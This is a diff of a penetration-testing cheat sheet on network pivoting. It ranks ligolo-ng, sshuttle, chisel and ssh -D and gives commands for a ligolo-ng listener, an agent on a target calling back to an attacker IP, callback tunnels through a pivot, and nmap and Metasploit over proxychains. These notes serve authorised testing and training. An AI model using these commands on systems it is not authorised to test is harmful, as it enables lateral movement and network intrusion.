@@ -119,33 +119,69 @@ netsh.exe interface portproxy show v4tov4
 
 # Dynamic Forwarding
 
-## SOCKS
+Ordered from best/most powerful to last resort:
 
-- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
-- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`
+- **ligolo-ng**: BEST (TUN interface)
+- **sshuttle**: root SSH + Python
+- **chisel**: HTTP/HTTPS egress only
+- **ssh -D**: SOCKS/proxychains, no Python
 
-| **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
-| ----------------------- | --------------------------------- | ------------------------------------- |
-| **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
-| **Addressing**          | IPv4 Only                         | **IPv4 & IPv6**                       |
-| **DNS Resolution**      | Client-side (vulnerable to leaks) | **Remote/Proxy-side** (via SOCKS5/4a) |
-| **Authentication**      | None (Ident-based only)           | **Username/Password**, GSS-API        |
-| **Nmap Compatibility**  | Native `--proxy` (very stable)    | Better via `proxychains`              |
-| **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
-| **Chisel Default**      | Not standard                      | **Native / Built-in**                 |
+## Ligolo-ng
+
+- https://docs.ligolo.ng/InstallBuild/
+- https://docs.ligolo.ng/Quickstart/
+
+Sets up a new interface and traffic moves through new interface and its respective route
+
+### ATTACKER: Listener
 
 ```bash
-sudo proxychains -q -f <CONFIG_FILE> <COMMAND>
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+# sudo ip route add <SUBNET>/24 dev <INTERFACE>
 
-sudo proxychains msfconsole
-
-# USE nmap's builtin --proxy option
-nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
-# --unprivileged avoids raw sockets and "bad" packets
-nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
+# If tunnel connects, sometimes route needs manual config
+sudo ip route add <SUBNET>/24 dev ligolo
 ```
 
-### Step 0: Pre-Requisites
+### Target 
+
+#### (Forward) ATTACKER connects to TARGET
+
+```bash
+# TARGET
+.\agent.exe -bind 0.0.0.0:<PORT>
+
+# ATTACKER: ligolo session
+connect_agent --ip <TARGET>:<PORT>
+session
+tunnel_start --tun ligolo
+```
+
+#### (Reverse) TARGET calls back to ATTACKER
+
+```bash
+# Target
+.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry
+
+# ATTACKER: ligolo session
+session
+tunnel_start --tun ligolo
+```
+
+### Tunnels (for Callbacks)
+
+Callbacks do **not** work automatically but can be enabled via a tunnel. These open port `PIVOT_PORT` on the `LIGOLO_REDIR` where the agent runs, so that `INNER_TARGET` can reach `ATTACKER`:
+
+`ATTACKER <== LIGOLO_REDIR <== INNER_TARGET`
+
+```bash
+listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<ATTACKER_PORT> --tcp
+```
+
+### Pre-Requisites
 
 ```bash
 # Edit ProxyChains Config
@@ -238,7 +274,6 @@ route
 
 "Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling `--dns`." **Works for TCP but NOT ICMP**
 
-
 ```bash
 sudo apt install -y sshuttle
 # NOTE: -x excludes the pivot IP to avoid routing issues
@@ -292,67 +327,29 @@ upx --lzma chisel*
 ./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> R:1080:socks
 ```
 
-## Ligolo-ng
+## SOCKS
 
-- https://docs.ligolo.ng/InstallBuild/
-- https://docs.ligolo.ng/Quickstart/
+- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
+- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`
 
-Sets up a new interface and route to move traffic
-
-**NOTE:** in [lab environments, might require fixing Go]({{% ref "troubleshooting.md#fix-go" %}})
-
-### Build
-
-```bash
-git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng
-
-# Build for Windows
-CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe cmd/agent/main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o proxy.exe cmd/proxy/main.go
-# Build for Linux
-CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o agent cmd/agent/main.go CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o proxy cmd/proxy/main.go
-### SHRINK (10MB -> 3MB)
-upx --lzma agent* proxy*
-```
-
-### ATTACKER: Listener
+| **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
+| ----------------------- | --------------------------------- | ------------------------------------- |
+| **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
+| **Addressing**          | IPv4 Only                         | **IPv4 & IPv6**                       |
+| **DNS Resolution**      | Client-side (vulnerable to leaks) | **Remote/Proxy-side** (via SOCKS5/4a) |
+| **Authentication**      | None (Ident-based only)           | **Username/Password**, GSS-API        |
+| **Nmap Compatibility**  | Native `--proxy` (very stable)    | Better via `proxychains`              |
+| **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
+| **Chisel Default**      | Not standard                      | **Native / Built-in**                 |
 
 ```bash
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
-sudo ./proxy -selfcert -laddr 0.0.0.0:11601
-# sudo ip route add <SUBNET>/24 dev <INTERFACE>
+sudo proxychains -q -f <CONFIG_FILE> <COMMAND>
+
+sudo proxychains msfconsole
+
+# USE nmap's builtin --proxy option
+nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
+# --unprivileged avoids raw sockets and "bad" packets
+nmap -n -Pn -sT -sV --unprivileged --proxy socks4://127.0.0.1:9050 -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
 ```
 
-### Target 
-
-#### (Forward) ATTACKER connects to TARGET
-
-```bash
-# TARGET
-.\agent.exe -bind 0.0.0.0:<PORT>
-
-# ATTACKER: ligolo session
-connect_agent --ip <TARGET>:<PORT>
-session
-tunnel_start --tun ligolo
-```
-
-#### (Reverse) TARGET calls back to ATTACKER
-
-```bash
-# Target
-.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry
-
-# ATTACKER: ligolo session
-session
-tunnel_start --tun ligolo
-```
-
-### Tunnels
-
-Callbacks do **not** work automatically but can be enabled via a tunnel
-
-```bash
-listener_add --addr 0.0.0.0:<PIVOT_PORT> --to 127.0.0.1:<ATTACKER_PORT> --tcp
-```
